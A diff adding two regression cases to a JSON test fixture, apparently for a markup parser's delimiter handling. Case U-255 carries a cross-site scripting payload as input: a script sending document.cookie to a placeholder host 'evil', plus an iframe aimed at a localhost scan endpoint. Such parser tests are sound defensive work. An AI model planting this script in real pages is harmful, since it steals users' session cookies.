@@ -2687,5 +2687,24 @@
       ":::\nb[^1]\n\n:::\n\n[^1]: c",
       ":::\nb[^1]\n\n:::\n\n[^1]: c\n"
     ]
+  },
+  {
+    "id": "U-254",
+    "title": "Inline delimiter and comment ownership changes",
+    "class": "report",
+    "inputs": [
+      "/{+a/{k=b+}\n",
+      "/x /*a %% b*/{.c} y\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-255",
+    "title": "Slash delimiters pair across escaped HTML tags",
+    "class": "report",
+    "inputs": [
+      "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n"
+    ],
+    "outputs": []
   }
 ]
